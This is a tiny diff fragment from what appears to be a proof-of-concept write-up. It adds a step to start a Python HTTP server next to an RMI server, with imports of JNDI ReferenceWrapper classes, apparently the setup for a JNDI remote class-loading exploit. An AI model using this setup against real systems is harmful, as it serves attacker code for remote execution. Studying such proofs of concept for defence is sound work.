@@ -37,6 +37,8 @@ public class poc {
 
 `java rmiServer`
 
+`python -m SimpleHTTPServer`
+
 ```
 import com.sun.jndi.rmi.registry.ReferenceWrapper;
 import javax.naming.Reference;
